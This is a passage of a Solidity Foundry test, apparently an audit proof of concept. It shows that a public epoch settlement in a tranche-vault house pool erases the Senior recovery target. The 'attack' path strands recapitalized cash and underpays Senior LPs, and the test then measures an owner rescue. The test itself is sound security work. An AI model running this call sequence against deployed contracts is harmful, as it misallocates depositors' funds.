        uint256 firstId = juniorVault.requestRedeem(bobShares, BOB, BOB);
        vm.warp(pool.lpEpochStart(firstId));
        vm.prank(BOB);
        pool.settleLpEpoch(0, 0);
        assertEq(pool.seniorHighWaterMark(), OWNER_RECAP, "initial recovery target");
        assertEq(pool.pendingRecapitalizationAssets(), deficit, "claim-limited recap residual");

        vm.prank(BOB);
        juniorVault.claimRedeemRefund(firstId, BOB, BOB);
        vm.expectRevert(IHousePool.HousePool__NoLpEpochProgress.selector);
        vm.prank(BOB);
        pool.settleLpEpoch(0, 0);
        vm.warp(juniorVault.lastDepositTime(BOB) + juniorVault.DEPOSIT_COOLDOWN());
        bobShares = juniorVault.balanceOf(BOB);
        vm.prank(BOB);
        secondId = juniorVault.requestRedeem(bobShares, BOB, BOB);
        vm.warp(pool.lpEpochStart(secondId));
    }

    function _withdrawSenior(
        address lp
    ) internal returns (uint256 assets) {
        uint256 shares = seniorVault.balanceOf(lp);
        vm.prank(lp);
        uint256 requestId = seniorVault.requestRedeem(shares, lp, lp);
        vm.warp(pool.lpEpochStart(requestId));
        vm.prank(lp);
        pool.settleLpEpoch(0, 0);
        uint256 claimableShares = seniorVault.claimableRedeemRequest(requestId, lp);
        if (claimableShares == 0) {
            return 0;
        }
        vm.prank(lp);
        assets = seniorVault.claimRedeem(requestId, claimableShares, lp, lp);
    }

    function _probeExtraRecapFromState(
        uint256 deficit,
        uint256 extraRecap
    ) private {
        uint256 secondId = _prepareJuniorEpoch(deficit);
        uint256 checkpoint = vm.snapshotState();
        uint256 finalTime = block.timestamp + 3 hours;

        (uint256 controlBob, uint256 controlSenior, uint256 controlUnassigned) =
            _controlWithTinyRecap(secondId, finalTime, extraRecap);
        uint256 controlPoolCash = pool.rawAssets();
        assertTrue(vm.revertToState(checkpoint));
        (uint256 attackBob, uint256 attackSenior, uint256 attackUnassigned) =
            _attackWithTinyRecap(secondId, finalTime, extraRecap, deficit);

        emit log_named_uint("extra_recap_usdg_6dec", extraRecap);
        emit log_named_uint("control_bob_usdg_6dec", controlBob);
        emit log_named_uint("attack_bob_usdg_6dec", attackBob);
        emit log_named_uint("control_senior_usdg_6dec", controlSenior);
        emit log_named_uint("attack_senior_usdg_6dec", attackSenior);
        assertEq(attackBob, controlBob, "repeated epoch cannot pay Junior from retained cash");
        if (extraRecap == 10_000e6) {
            assertEq(controlUnassigned, 0, "control cash remains assigned");
            assertGt(attackUnassigned, 0, "attack strands value outside LP claims");
            assertGt(controlSenior, attackSenior, "Senior receives less backed cash");
            assertEq(
                pool.rawAssets() - controlPoolCash,
                controlSenior - attackSenior,
                "Senior shortfall remains in Pool cash"
            );
            uint256 rescueStart = vm.getBlockTimestamp();
            vm.expectRevert(IHousePool.HousePool__ExceedsSeniorDepositCapacity.selector);
            pool.assignUnassignedAssets(true, CAROL);
            pool.assignUnassignedAssets(false, CAROL);
            assertEq(pool.unassignedAssets(), 0, "owner can assign value to Junior shares for Senior LP");
            uint256 rescueShares = juniorVault.balanceOf(CAROL);
            assertGt(rescueShares, 0, "Carol receives rescue Junior shares");
            vm.expectRevert(TrancheVault.TrancheVault__DepositCooldown.selector);
            vm.prank(CAROL);
            juniorVault.requestRedeem(rescueShares, CAROL, CAROL);
            vm.warp(rescueStart + juniorVault.DEPOSIT_COOLDOWN() - 1);
            vm.expectRevert(TrancheVault.TrancheVault__DepositCooldown.selector);
            vm.prank(CAROL);
            juniorVault.requestRedeem(rescueShares, CAROL, CAROL);
            vm.warp(rescueStart + juniorVault.DEPOSIT_COOLDOWN());
            vm.prank(CAROL);
            uint256 rescueId = juniorVault.requestRedeem(rescueShares, CAROL, CAROL);
            vm.warp(pool.lpEpochStart(rescueId));
            vm.prank(CAROL);
            pool.settleLpEpoch(0, 0);
            uint256 claimableRescueShares = juniorVault.claimableRedeemRequest(rescueId, CAROL);
            emit log_named_uint("carol_rescue_claimable_shares", claimableRescueShares);
            assertGt(claimableRescueShares, 0, "rescue must fund a real claim");
            vm.prank(CAROL);
            uint256 rescueReceipt = juniorVault.claimRedeem(rescueId, claimableRescueShares, CAROL, CAROL);
            emit log_named_uint("carol_rescue_junior_usdg_6dec", rescueReceipt);
            uint256 rescueDelay = vm.getBlockTimestamp() - rescueStart;
            emit log_named_uint("carol_rescue_delay_seconds", rescueDelay);
            assertGe(rescueReceipt, controlSenior - attackSenior - 1e6);
            assertGe(rescueDelay, 1 hours, "earliest owner rescue takes one hour");
        }
    }

    function _controlWithTinyRecap(
        uint256 secondId,
        uint256 finalTime,
        uint256 extraRecap
    ) private returns (uint256 bobReceipt, uint256 seniorReceipt, uint256 unassignedAssets) {
        vm.warp(finalTime);
        _recapitalize(extraRecap);
        vm.prank(BOB);
        pool.settleLpEpoch(0, 0);
        emit log_named_uint("control_max_senior_deposit_usdg_6dec", seniorVault.maxRequestDeposit(DAVE));
        emit log_named_uint("control_max_junior_deposit_usdg_6dec", juniorVault.maxRequestDeposit(DAVE));
        uint256 shares = juniorVault.claimableRedeemRequest(secondId, BOB);
        if (shares > 0) {
            vm.prank(BOB);
            bobReceipt = juniorVault.claimRedeem(secondId, shares, BOB, BOB);
        }
        seniorReceipt = _withdrawSenior(CAROL);
        bobReceipt += _retryJuniorRedemption(secondId);
        emit log_named_uint("control_pool_cash_usdg_6dec", pool.rawAssets());
        emit log_named_uint("control_trader_claims_usdg_6dec", engine.totalTraderClaimBalanceAssets());
        emit log_named_uint("control_pending_recap_usdg_6dec", pool.pendingRecapitalizationAssets());
        emit log_named_uint("control_unassigned_usdg_6dec", pool.unassignedAssets());
        emit log_named_uint("control_free_usdg_6dec", pool.getFreeAssets());
        emit log_named_uint("control_senior_principal_usdg_6dec", pool.seniorPrincipal());
        emit log_named_uint("control_junior_principal_usdg_6dec", pool.juniorPrincipal());
        unassignedAssets = pool.unassignedAssets();
    }

    function _attackWithTinyRecap(
        uint256 secondId,
        uint256 finalTime,
        uint256 extraRecap,
        uint256 deficit
    ) private returns (uint256 bobReceipt, uint256 seniorReceipt, uint256 unassignedAssets) {
        uint256 originalCash = pool.rawAssets();
        uint256 originalTraderClaims = engine.totalTraderClaimBalanceAssets();
        uint256 originalSeniorShares = seniorVault.totalSupply();
        assertGt(originalSeniorShares, 0, "Senior owners survive before attack");
        assertEq(pool.seniorHighWaterMark(), OWNER_RECAP, "old Senior target survives before attack");
        assertEq(pool.pendingRecapitalizationAssets(), deficit, "old recap is still pending");
        assertEq(pool.pendingTradingRevenueAssets(), 0, "no same-batch revenue to reroute");
        vm.prank(BOB);
        pool.settleLpEpoch(0, 0);
        assertEq(pool.seniorHighWaterMark(), deficit, "public epoch erases existing Senior target");
        assertEq(seniorVault.totalSupply(), originalSeniorShares, "public epoch burns no Senior shares");
        assertEq(pool.rawAssets(), originalCash, "public epoch has no cash inflow");
        assertEq(
            engine.totalTraderClaimBalanceAssets(), originalTraderClaims, "public epoch does not change trader claims"
        );
        vm.prank(BOB);
        juniorVault.claimRedeemRefund(secondId, BOB, BOB);
        vm.warp(juniorVault.lastDepositTime(BOB) + juniorVault.DEPOSIT_COOLDOWN());
        uint256 bobShares = juniorVault.balanceOf(BOB);
        vm.prank(BOB);
        uint256 thirdId = juniorVault.requestRedeem(bobShares, BOB, BOB);
        vm.warp(pool.lpEpochStart(thirdId));
        assertLe(block.timestamp, finalTime);
        vm.warp(finalTime);
        _recapitalize(extraRecap);
        vm.prank(BOB);
        pool.settleLpEpoch(0, 0);
        emit log_named_uint("attack_unassigned_before_senior_usdg_6dec", pool.unassignedAssets());
        emit log_named_uint("attack_max_senior_deposit_usdg_6dec", seniorVault.maxRequestDeposit(DAVE));
        emit log_named_uint("attack_max_junior_deposit_usdg_6dec", juniorVault.maxRequestDeposit(DAVE));
        uint256 shares = juniorVault.claimableRedeemRequest(thirdId, BOB);
        if (shares > 0) {
            vm.prank(BOB);
            bobReceipt = juniorVault.claimRedeem(thirdId, shares, BOB, BOB);
        }
        seniorReceipt = _withdrawSenior(CAROL);
        bobReceipt += _retryJuniorRedemption(thirdId);
        emit log_named_uint("attack_pool_cash_usdg_6dec", pool.rawAssets());
        emit log_named_uint("attack_trader_claims_usdg_6dec", engine.totalTraderClaimBalanceAssets());
        emit log_named_uint("attack_pending_recap_usdg_6dec", pool.pendingRecapitalizationAssets());
        emit log_named_uint("attack_unassigned_usdg_6dec", pool.unassignedAssets());
        emit log_named_uint("attack_free_usdg_6dec", pool.getFreeAssets());
        emit log_named_uint("attack_senior_principal_usdg_6dec", pool.seniorPrincipal());
        emit log_named_uint("attack_junior_principal_usdg_6dec", pool.juniorPrincipal());
        unassignedAssets = pool.unassignedAssets();
    }

    function _recapitalize(
        uint256 amount
    ) private {
        settlementToken.mint(address(this), amount);
        settlementToken.approve(address(engine), amount);
        engine.recapitalizePool(amount);
    }

    function _retryJuniorRedemption(
        uint256 requestId
    ) private returns (uint256 receipt) {
        vm.prank(BOB);
        juniorVault.claimRedeemRefund(requestId, BOB, BOB);
        vm.warp(juniorVault.lastDepositTime(BOB) + juniorVault.DEPOSIT_COOLDOWN());
        uint256 shares = juniorVault.balanceOf(BOB);
        vm.prank(BOB);
        uint256 retryId = juniorVault.requestRedeem(shares, BOB, BOB);
        vm.warp(pool.lpEpochStart(retryId));
        vm.prank(BOB);
        pool.settleLpEpoch(0, 0);
        uint256 claimableShares = juniorVault.claimableRedeemRequest(retryId, BOB);
        if (claimableShares > 0) {
            vm.prank(BOB);
            receipt = juniorVault.claimRedeem(retryId, claimableShares, BOB, BOB);
        }
    }

    function _normalRevenueTrade() private {
        uint256 poolCashBefore = pool.rawAssets();
        _tradePublic(
            Trade({
                account: REVENUE_TRADER,
                side: CfdTypes.Side.LONG,
                size: 10_000e18,
                margin: 1000e6,
                price: 1e8,
                close: false
            })
        );
        vm.warp(block.timestamp + 12 weeks);
        _tradePublic(
            Trade({
                account: REVENUE_TRADER, side: CfdTypes.Side.LONG, size: 10_000e18, margin: 0, price: 1e8, close: true
            })
        );
        assertGt(pool.rawAssets(), poolCashBefore, "same-price trade pays real Pool revenue");
    }

    function _claimSeniorThenJunior() private returns (uint256 carolReceipt, uint256 bobReceipt) {
        carolReceipt = _withdrawSenior(CAROL);
        uint256 bobShares = juniorVault.balanceOf(BOB);
        vm.prank(BOB);
        uint256 requestId = juniorVault.requestRedeem(bobShares, BOB, BOB);
        vm.warp(pool.lpEpochStart(requestId));
        vm.prank(BOB);
        pool.settleLpEpoch(0, 0);
        uint256 claimableShares = juniorVault.claimableRedeemRequest(requestId, BOB);
        if (claimableShares > 0) {
            uint256 bobBalanceBefore = settlementToken.balanceOf(BOB);
            vm.prank(BOB);
            bobReceipt = juniorVault.claimRedeem(requestId, claimableShares, BOB, BOB);
            assertEq(
                settlementToken.balanceOf(BOB) - bobBalanceBefore,
                bobReceipt,
                "claim sends actual settlement tokens to Bob"
            );
        }
    }

    function _tradePublic(
        Trade memory trade
    ) internal {
        uint256 targetPrice = (trade.side == CfdTypes.Side.LONG) == trade.close ? type(uint256).max : 1;
        uint32 window = uint32(router.maxExecutionWindowSeconds());
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(router.nextCommitId())),
            side: trade.side,
            sizeDelta: trade.size,
            marginDelta: trade.margin,
            targetPrice: targetPrice,
            isClose: trade.close,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(block.timestamp) + uint64(window),
                executionWindowSeconds: window,
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(trade.account);
        uint64 orderId = router.commitOrder(request);
        bytes[] memory update = _mockPythUpdateData(trade.price);
        vm.prank(address(0xE0E));
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, update);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "public order executed");
    }

}
```

